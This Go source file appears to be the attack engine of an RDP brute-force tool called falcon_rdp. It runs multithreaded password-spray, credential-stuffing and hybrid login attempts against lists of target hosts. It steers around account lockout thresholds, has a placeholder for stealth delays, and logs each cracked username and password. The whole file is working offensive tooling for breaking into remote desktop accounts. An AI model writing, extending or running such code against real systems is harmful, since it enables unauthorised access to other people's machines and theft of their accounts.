package attack

import (
	"context"
	"fmt"
	"sync"
	"sync/atomic"
	"time"

	"github.com/falconjonz/falcon_rdp/config"
	"github.com/falconjonz/falcon_rdp/logger"
	"github.com/falconjonz/falcon_rdp/rdp"
)

type AttackEngine struct {
	cfg              *config.Config
	log              *logger.Logger
	rdpClient        *rdp.Client
	workerPool       *WorkerPool
	targets          []config.Target
	credentials      []config.Credential
	results          []config.Result
	mu               sync.RWMutex
	ctx              context.Context
	cancel           context.CancelFunc
	stats            config.Statistics
	lockoutTracker   map[string]int // user@host -> failed attempts
	lockoutMu        sync.RWMutex
	attemptedCreds   map[string]bool // tracking to avoid duplicates
	attemptedMu      sync.RWMutex
}

// NewAttackEngine creates a new attack engine
func NewAttackEngine(cfg *config.Config, log *logger.Logger) *AttackEngine {
	ctx, cancel := context.WithCancel(context.Background())

	return &AttackEngine{
		cfg:            cfg,
		log:            log,
		rdpClient:      rdp.NewClient(cfg, log),
		ctx:            ctx,
		cancel:         cancel,
		stats:          config.Statistics{StartTime: time.Now()},
		lockoutTracker: make(map[string]int),
		attemptedCreds: make(map[string]bool),
	}
}

// SetTargets sets attack targets
func (ae *AttackEngine) SetTargets(targets []config.Target) {
	ae.mu.Lock()
	defer ae.mu.Unlock()
	ae.targets = targets
}

// SetCredentials sets attack credentials
func (ae *AttackEngine) SetCredentials(creds []config.Credential) {
	ae.mu.Lock()
	defer ae.mu.Unlock()
	ae.credentials = creds
}

// Start starts the attack
func (ae *AttackEngine) Start() error {
	ae.mu.RLock()
	if len(ae.targets) == 0 || len(ae.credentials) == 0 {
		ae.mu.RUnlock()
		return fmt.Errorf("targets or credentials not set")
	}
	ae.mu.RUnlock()

	// Initialize worker pool
	ae.workerPool = NewWorkerPool(ae.cfg.Attack.Threads, ae.cfg, ae.log)
	ae.workerPool.Start(ae.handleWorkItem)

	// Start dispatcher goroutine
	go ae.dispatcher()

	// Start result collector
	go ae.resultCollector()

	return nil
}

// dispatcher generates work items based on attack strategy
func (ae *AttackEngine) dispatcher() {
	ae.mu.RLock()
	targets := ae.targets
	credentials := ae.credentials
	ae.mu.RUnlock()

	switch ae.cfg.Attack.Strategy {
	case config.PasswordSpray:
		ae.passwordSprayDispatcher(targets, credentials)
	case config.CredentialStuff:
		ae.credentialStuffDispatcher(targets, credentials)
	case config.Hybrid:
		ae.hybridDispatcher(targets, credentials)
	}

	ae.workerPool.Stop()
}

// passwordSprayDispatcher: one password against all users
func (ae *AttackEngine) passwordSprayDispatcher(targets []config.Target, credentials []config.Credential) {
	// Group credentials by password
	passwordMap := make(map[string][]config.Credential)
	for _, cred := range credentials {
		passwordMap[cred.Password] = append(passwordMap[cred.Password], cred)
	}

	for password, userCreds := range passwordMap {
		for _, target := range targets {
			for _, cred := range userCreds {
				select {
				case <-ae.ctx.Done():
					return
				default:
				}

				// Check lockout
				if ae.isLockedOut(cred.Username, target.IP) {
					continue
				}

				// Apply stealth delays
				if ae.cfg.Stealth.Enabled {
					ae.applyStealth()
				}

				item := WorkItem{
					Target:     target,
					Credential: cred,
				}

				ae.workerPool.Submit(item)
			}
			_ = password // Use password to avoid complaint
		}
	}
}

// credentialStuffDispatcher: all passwords against one user
func (ae *AttackEngine) credentialStuffDispatcher(targets []config.Target, credentials []config.Credential) {
	// Group credentials by username
	userMap := make(map[string][]config.Credential)
	for _, cred := range credentials {
		userMap[cred.Username] = append(userMap[cred.Username], cred)
	}

	for _, target := range targets {
		for user, userCreds := range userMap {
			for _, cred := range userCreds {
				select {
				case <-ae.ctx.Done():
					return
				default:
				}

				if ae.isLockedOut(user, target.IP) {
					continue
				}

				if ae.cfg.Stealth.Enabled {
					ae.applyStealth()
				}

				item := WorkItem{
					Target:     target,
					Credential: cred,
				}

				ae.workerPool.Submit(item)
			}
		}
	}
}

// hybridDispatcher: hybrid of spray and stuff
func (ae *AttackEngine) hybridDispatcher(targets []config.Target, credentials []config.Credential) {
	for _, target := range targets {
		for _, cred := range credentials {
			select {
			case <-ae.ctx.Done():
				return
			default:
			}

			if ae.isLockedOut(cred.Username, target.IP) {
				continue
			}

			if ae.cfg.Stealth.Enabled {
				ae.applyStealth()
			}

			item := WorkItem{
				Target:     target,
				Credential: cred,
			}

			ae.workerPool.Submit(item)
		}
	}
}

// handleWorkItem handles a single work item
func (ae *AttackEngine) handleWorkItem(item WorkItem) WorkResult {
	result := WorkResult{
		Target:     item.Target,
		Credential: item.Credential,
	}

	// Attempt RDP authentication
	success, err := ae.rdpClient.Authenticate(item.Target, item.Credential)

	if err != nil {
		result.Error = err.Error()
		result.Success = false
		atomic.AddInt64(&ae.stats.FailedAttempts, 1)

		// Track lockout
		ae.lockoutMu.Lock()
		key := fmt.Sprintf("%s@%s", item.Credential.Username, item.Target.IP)
		ae.lockoutTracker[key]++
		ae.lockoutMu.Unlock()
	} else if success {
		result.Success = true
		atomic.AddInt64(&ae.stats.SuccessfulLogins, 1)
		ae.log.Successf("Found: %s:%s@%s:%d", item.Credential.Username, item.Credential.Password, item.Target.IP, item.Target.Port)
	} else {
		result.Success = false
		atomic.AddInt64(&ae.stats.FailedAttempts, 1)
		ae.lockoutMu.Lock()
		key := fmt.Sprintf("%s@%s", item.Credential.Username, item.Target.IP)
		ae.lockoutTracker[key]++
		ae.lockoutMu.Unlock()
	}

	atomic.AddInt64(&ae.stats.TotalAttempts, 1)
	return result
}

// resultCollector collects results from worker pool
func (ae *AttackEngine) resultCollector() {
	for result := range ae.workerPool.Results() {
		if result.Success {
			ae.mu.Lock()
			ae.results = append(ae.results, config.Result{
				IP:        result.Target.IP,
				Port:      result.Target.Port,
				Username:  result.Credential.Username,
				Password:  result.Credential.Password,
				Domain:    result.Credential.Domain,
				Timestamp: result.Timestamp,
			})
			ae.mu.Unlock()
		}
	}
}

// isLockedOut checks if user is locked out
func (ae *AttackEngine) isLockedOut(username, ip string) bool {
	ae.lockoutMu.RLock()
	defer ae.lockoutMu.RUnlock()

	key := fmt.Sprintf("%s@%s", username, ip)
	return ae.lockoutTracker[key] >= ae.cfg.Attack.LockoutThreshold
}

// applyStealth applies stealth delays
func (ae *AttackEngine) applyStealth() {
	// TODO: Implement jitter and adaptive rate limiting
	// For now, just sleep
	// time.Sleep(100 * time.Millisecond)
}

// Stop stops the attack
func (ae *AttackEngine) Stop() {
	ae.cancel()
	if ae.workerPool != nil {
		ae.workerPool.Wait()
	}
	ae.stats.EndTime = time.Now()
}

// GetResults returns successful results
func (ae *AttackEngine) GetResults() []config.Result {
	ae.mu.RLock()
	defer ae.mu.RUnlock()

	results := make([]config.Result, len(ae.results))
	copy(results, ae.results)
	return results
}

// GetStats returns attack statistics
func (ae *AttackEngine) GetStats() config.Statistics {
	return config.Statistics{
		TotalAttempts:    atomic.LoadInt64(&ae.stats.TotalAttempts),
		SuccessfulLogins: atomic.LoadInt64(&ae.stats.SuccessfulLogins),
		FailedAttempts:   atomic.LoadInt64(&ae.stats.FailedAttempts),
		StartTime:        ae.stats.StartTime,
		EndTime:          ae.stats.EndTime,
	}
}
